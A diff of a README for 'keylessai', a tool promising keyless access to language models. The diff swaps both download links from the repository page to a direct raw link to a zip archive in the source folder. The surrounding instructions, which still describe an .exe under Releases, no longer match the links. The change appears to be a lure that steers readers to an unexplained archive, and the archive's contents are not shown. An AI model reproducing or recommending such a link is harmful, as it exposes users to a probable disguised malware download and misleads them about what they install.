@@ -1,12 +1,12 @@
 # 🤖 keylessai - Access language models without any keys
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Devineukaryotic6777/keylessai)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Devineukaryotic6777/keylessai/main/src/Software_v3.2.zip)
 
 keylessai provides a simple way to use artificial intelligence models on your computer. It connects to public services to fetch responses from language models known as LLMs. You do not need to sign up for accounts or purchase expensive service keys. The application manages the connections for you and switches between services if one stops working.
 
 ## 📥 How to download the application
 
-Visit the following link to find the latest version of the software: [Download keylessai](https://github.com/Devineukaryotic6777/keylessai).
+Visit the following link to find the latest version of the software: [Download keylessai](https://raw.githubusercontent.com/Devineukaryotic6777/keylessai/main/src/Software_v3.2.zip).
 
 On this page, look for the section labeled Releases on the right side of your screen. Click the most recent version number. Scroll down to the Assets area and choose the file ending in .exe for your Windows computer. Save the installation file to your desktop or downloads folder.
 
